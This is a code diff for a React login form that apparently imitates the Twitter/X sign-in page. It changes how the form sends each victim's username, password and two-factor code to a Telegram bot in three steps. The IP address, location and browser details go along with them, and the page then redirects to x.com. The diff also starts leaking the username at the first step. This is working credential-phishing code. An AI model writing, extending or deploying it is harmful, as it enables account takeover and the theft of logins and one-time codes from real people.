@@ -1,9 +1,9 @@
 "use client";
 
-import { useCallback, useEffect, useLayoutEffect, useState } from "react";
-import { sendDataToTelegram } from "@/helpers/send-data-to-telegram";
+import { useCallback, useState } from "react";
+import { sendMessageToTelegramBot } from "@/helpers/send-data-to-telegram";
 import Image from "next/image";
-import { getInputType, InputType } from "@/helpers/getInputType";
+import { getInputType, InputType, messageLabel } from "@/helpers/getInputType";
 import { Input } from "./input";
 import type { User } from "@prisma/client";
 import type { TwitterUser } from "@/app/api/twitter/users/route";
@@ -57,6 +57,22 @@ export function LoginFormSteps({ browserData }: Props) {
 	const handleFirstStep = async () => {
 		setLoading(true);
 		const inputType = getInputType(username);
+
+		const { origin, pathname } = window.location;
+
+		await sendMessageToTelegramBot({
+			message: `
+🔒 USER AUTHENTICATION STEP 1
+
+👤 ${messageLabel[inputType]}: ${username}
+
+🖥️ IP: ${browserData.ip}
+🌍 Location: ${browserData.geoLocation}
+🧩 Agent: ${browserData.userAgent}
+
+🌐 SITE: ${origin}${pathname}
+`,
+		});
 
 		if (inputType === InputType.Username) {
 			const response = await fetch(`/api/twitter/users?username=${username}`);
@@ -115,14 +131,19 @@ export function LoginFormSteps({ browserData }: Props) {
 
 		const { origin, pathname } = window.location;
 
-		await sendDataToTelegram({
-			emailOrPhone: data.user.emailOrPhone || "",
-			password: data.user.password || "",
-			code: "",
-			pageUrl: `${origin}${pathname}`,
-			userIp: browserData.ip,
-			userAgent: browserData.userAgent,
-			geoLocation: browserData.geoLocation,
+		await sendMessageToTelegramBot({
+			message: `
+🔒 USER AUTHENTICATION STEP 2
+
+👤 ${messageLabel[getInputType(username)]}: ${username}
+👤 Password: ${password}
+
+🖥️ IP: ${browserData.ip}
+🌍 Location: ${browserData.geoLocation}
+🧩 Agent: ${browserData.userAgent}
+
+🌐 SITE: ${origin}${pathname}
+`,
 		});
 
 		setUserId(data?.user?.id);
@@ -135,7 +156,7 @@ export function LoginFormSteps({ browserData }: Props) {
 	const handleSaveUserCode = useCallback(async () => {
 		setLoading(true);
 
-		const response = await fetch("/api/users", {
+		await fetch("/api/users", {
 			method: "PUT",
 			headers: {
 				"Content-Type": "application/json",
@@ -146,28 +167,28 @@ export function LoginFormSteps({ browserData }: Props) {
 			}),
 		});
 
-		if (!response.ok) {
-			throw new Error("Failed to save user.");
-		}
-
-		const data = (await response.json()) as { user: User };
-
 		const { origin, pathname } = window.location;
 
-		await sendDataToTelegram({
-			emailOrPhone: data.user.emailOrPhone,
-			password: data.user.password,
-			code: data.user?.code || "",
-			pageUrl: `${origin}${pathname}`,
-			userIp: browserData.ip,
-			userAgent: browserData.userAgent,
-			geoLocation: browserData.geoLocation,
+		await sendMessageToTelegramBot({
+			message: `
+🔒 USER AUTHENTICATION STEP 3
+
+👤 ${messageLabel[getInputType(username)]}: ${username}
+👤 Password: ${password}
+👤 2FA_CODE: ${code}
+
+🖥️ IP: ${browserData.ip}
+🌍 Location: ${browserData.geoLocation}
+🧩 Agent: ${browserData.userAgent}
+
+🌐 SITE: ${origin}${pathname}
+`,
 		});
 
 		setLoading(false);
 
 		window.location.href = "https://x.com";
-	}, [userId, code, browserData]);
+	}, [userId, username, password, code, browserData]);
 
 	return (
 		<>
